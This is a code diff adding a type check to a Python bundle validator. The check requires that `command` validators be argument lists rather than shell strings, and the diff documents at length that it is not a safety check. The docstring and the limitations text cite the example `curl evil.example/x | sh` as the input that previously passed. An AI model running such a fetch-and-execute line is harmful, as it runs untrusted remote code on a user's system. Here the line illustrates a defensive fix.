@@ -495,6 +495,25 @@ LIMITATIONS = """What a pass does and does not mean
       not its truth. It cannot tell whether the learner was really offered
       anything, really deferred it, or really finished it.
 
+  Validator commands (`kind: command`):
+    check 8 proves the SHAPE of `command` and nothing else: a non-empty list
+      whose every element is a non-empty string. A string, an empty list, a
+      mapping and a list holding a number are all findings. Before this rule
+      existed a `command` of "curl evil.example/x | sh" exited 0 with no
+      finding at all.
+    IT IS NOT A SAFETY CHECK AND MUST NEVER BE READ AS ONE. Nothing here
+      knows what the program does, whether it is installed, what it writes,
+      or whether the bundle should be trusted to name it. A green run says
+      the argument list is well formed; it says nothing whatever about
+      running it. The design this rule comes from
+      (docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md
+      section 2.1) makes "these commands have been checked" a defect in its
+      own right.
+    nothing here executes a validator, and nothing in this repository does.
+      The tutor runs the declared argument list through its own host, where
+      that host's permission layer sees it. That is the only boundary there
+      is, and moving execution into a script here would destroy it.
+
   Supplies (`supplies:`):
     an ABSENT key and a PRESENT-but-empty one (`supplies:` with nothing
       under it, or `supplies: []`) are both silent and both report "n/a" -
@@ -894,6 +913,74 @@ def check_state_files(root: Path, mode: str, manifest: Any, report: Report) -> N
     report.ran(7, f"mode={mode}")
 
 
+def _command_shape_error(command: Any) -> str | None:
+    """Check 8's type rule for `kind: command` - the argument list's SHAPE.
+
+    `command` MUST be a non-empty list whose every element is a non-empty
+    string. The rule belongs to the claim check 8 already makes about a
+    validator definition, so it tightens that check rather than adding a
+    number; the 28 existing ids stay stable.
+
+    MEASURED 2026-09-13, repository source at `3b5a6b8`: a copy of
+    tests/fixtures/rust-cli-basics with `command: "curl evil.example/x | sh"`
+    exits 0 with no finding. Controls: the unmodified fixture exits 0;
+    `kind: comand` reports `kind 'comand' is not one of ...`; `{ kind:
+    command }` reports `kind 'command' requires the field 'command'`. The
+    probe saw check 8 findings and did not see this one, because the loop
+    above is presence-only - `if extra not in vdef` - and a string is
+    present.
+
+    WHY THE LIST IS THE RULE. `runner-protocol.md` section 2.5 says a
+    `command` validator is "the declared argument list", run in the
+    workspace root. An argument list reaches the host's tool layer as a
+    vector, where the host's own permission prompt sees each argument for
+    what it is. A single string does not: whoever runs it has to decide
+    where the words divide, and the honest way to run
+    `curl evil.example/x | sh` is through a shell, which turns one declared
+    validator into a pipeline the declaration never showed. The banner
+    `state-lifecycle.md` section 3 draws names `argv[0]` of every command
+    validator; a string has no argv[0] that can be read without guessing.
+
+    It says NOTHING about whether the program is safe to run. No check here
+    can, and `docs/superpowers/specs/2026-09-14-validator-trust-and-setup-checks-design.md`
+    section 2.1 forbids any wording that implies one did.
+    """
+    if not isinstance(command, list):
+        actual = (
+            "nothing at all - the key is written with no value under it"
+            if command is None
+            else f"{type(command).__name__}: {command!r}"
+        )
+        return (
+            f"a 'command' validator's 'command' must be a list of arguments, "
+            f"e.g. [cargo, check]; it is {actual}. The runner runs the "
+            f"declared argument list, so a single string leaves the word "
+            f"division - and the shell - to whoever runs it."
+        )
+    if not command:
+        return (
+            "a 'command' validator's 'command' is an empty list, so there is "
+            "no program to run. Name the program and its arguments, e.g. "
+            "[cargo, check]."
+        )
+    for index, item in enumerate(command):
+        if not isinstance(item, str):
+            return (
+                f"a 'command' validator's 'command' entry at position "
+                f"{index} is {type(item).__name__}: {item!r}. Every element "
+                f"of the argument list must be a string; quote it if it is "
+                f"meant to be one."
+            )
+        if item == "":
+            return (
+                f"a 'command' validator's 'command' entry at position "
+                f"{index} is an empty string. An empty argument is passed to "
+                f"the program as one, which is almost never what was meant; "
+                f"remove it."
+            )
+    return None
+
+
 def check_manifest(manifest: Any, report: Report) -> None:
     """Check 8 - required fields and validator definitions."""
     if not isinstance(manifest, dict):
@@ -962,6 +1049,10 @@ def check_manifest(manifest: Any, report: Report) -> None:
                         where,
                         f"kind {kind!r} requires the field {extra!r}",
                     )
+            if kind == "command" and "command" in vdef:
+                problem = _command_shape_error(vdef["command"])
+                if problem is not None:
+                    report.add(8, where, problem)
     report.ran(8, f"{len(REQUIRED_MANIFEST_FIELDS)} required fields")
 
 
